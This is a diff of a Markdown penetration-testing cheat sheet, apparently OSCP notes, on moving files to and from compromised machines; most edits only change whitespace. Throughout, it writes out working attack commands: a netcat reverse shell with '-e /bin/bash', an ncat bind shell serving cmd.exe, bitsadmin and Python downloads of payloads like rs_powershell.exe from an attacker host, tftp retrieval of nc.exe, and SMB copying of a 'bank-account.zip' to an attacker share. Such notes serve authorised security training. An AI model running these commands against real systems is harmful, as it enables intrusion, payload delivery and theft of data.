@@ -1,7 +1,11 @@
 # File transfer
 **Netcat [nc]**
+
 `nc -w 3 <target_ip> 1234 < LinEnum.sh` on target machine: `nc -l -p 1234 > LinEnum.sh`
+
 `nc IP_ADDR PORT > OUTFILE` (run `nc -lvp PORT < infile` on attacking machine)
+
+
 
 **Bob sets listener with shell:** 
 
@@ -10,6 +14,8 @@
 **or Bob listens:**
 
 `nc -nlvp 4444`  -> Alice sends her shell to Bob's listener: `nc -nv 10.0.0.22 4444 -e /bin/bash`
+
+
 
 **Ncat - Bind shell [listener shares shell]**
 `ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl`
@@ -83,10 +89,13 @@ https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/
 `bitsadmin /transfer download /priority normal http://IP_ADDR/file C:\output\path` (Works on Windows 7/Windows Server 2000+)
 `bitsadmin /transfer download /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe`
 
+
+
 ### Python
 
 ``` python 
-C:\Python2.7\python.exe -c "import urllib; f = urllib.URLopener(); f.retrieve('http://<attacker ip>/rs_powershell.exe', '/temp/rs_powershell.exe');" 
+C:\Python2.7\python.exe -c "import urllib; f = urllib.URLopener();
+f.retrieve('http://<attacker ip>/rs_powershell.exe', '/temp/rs_powershell.exe');" 
 ```
 
 
@@ -94,12 +103,16 @@ C:\Python2.7\python.exe -c "import urllib; f = urllib.URLopener(); f.retrieve('h
 ### FTP
 
 `Python ftp\ - python -m pyftpdlib -w -p 21`
-the best way i've found for file transfer on MOST machines is to just use plain old ftp. just about every 
-windows machine has it installed by default, and you can get a really good quick and easy python script 
+
+The best way i've found for file transfer on MOST machines is to just use plain old ftp. just about every 
+windows machine has it installed by default, and you can get a really good quick and easy python script.
+
  "`pip install pyftpdlib` or `pip3 install pyftpdlib`" once pyftpdlib is installed, just run it in the directory you want to download files to with "`python -m pyftpdlib -w -p 21`" then on your client machine type ftp -A your.ip.add.ress (the -A is for Anonymous, these shells will hang on user/password entry sometimes, don't use this option with linux machines though) and you're ready to transfer files!
+
 `python -m pyftpdlib -w -p 21` or `python3 -m pyftpdlib -w`
 
 `ftp -s:input.txt`
+
 `tftp -i 10.11.0.126 get nc.exe`
 
 
@@ -107,6 +120,7 @@ windows machine has it installed by default, and you can get a really good quick
 ### HTTP Server
 
 `python3 -m http.server`
+
 `python -m SimpleHTTPServer`
 
 
@@ -167,7 +181,9 @@ xcopy /s /E \\<host>\SHARE\dir c:\blah - Xcopy recursively files &
 `python /usr/share/doc/python-impacket/examples/smbserver.py files /root/Documents/oscp/files/windows-binaries`
 
 **To put/get files:**
-`copy \\10.11.0.126\files\nc.exe` .
+
+`copy \\10.11.0.126\files\nc.exe` 
+
 `copy C:\bank-account.zip \\10.11.0.126\files\`
 
 **Execute a file from SMB server**
